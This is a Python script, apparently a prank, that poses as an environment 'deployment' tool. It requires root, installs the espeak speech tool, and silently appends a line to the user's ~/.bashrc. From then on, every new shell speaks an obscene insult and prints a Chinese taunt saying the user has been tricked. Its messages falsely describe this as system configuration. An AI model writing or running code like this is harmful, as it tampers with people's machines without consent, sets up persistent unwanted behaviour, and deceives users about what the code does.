#!/bin/python3
import os
import sys
words = 'espeak "fuck you,ha ha ha dashabi" && echo "笨蛋被我耍了吧"'
"""获取用户目录，添加到bashrc文件里面"""
home_list = os.path.expanduser("~")
bashrc_path = os.path.join(home_list,".bashrc")
"""检查是否添加过"""
def add_words_to_bashrc():
	with open(bashrc_path, "r") as f:
		if words in f.read():
			print("环境已经配置过了")
			return
	with open(bashrc_path,"a") as f:
		f.write(f"""{words}""")
	print("环境已经配置到系统，下次打开时生效")
def install_espeak():
	print("安装espeak语音合成工具")
	print("sudo apt update")
	os.system("sudo apt install -y espeak")
def main():
	"""检查有效id"""
	if os.geteuid() != 0:
		print("请使用root权限运行此脚本")
		sys.exit(1)
	"""安装espeak"""
	install_espeak()
	"""配置bashrc，配置环境"""
	add_words_to_bashrc()
	print("部署已经完成")
	os.system('espeak "fuck you,ha ha ha dashabi"')
	os.system('echo "笨蛋被我耍了吧"')
if __name__ == "__main__":
	main()
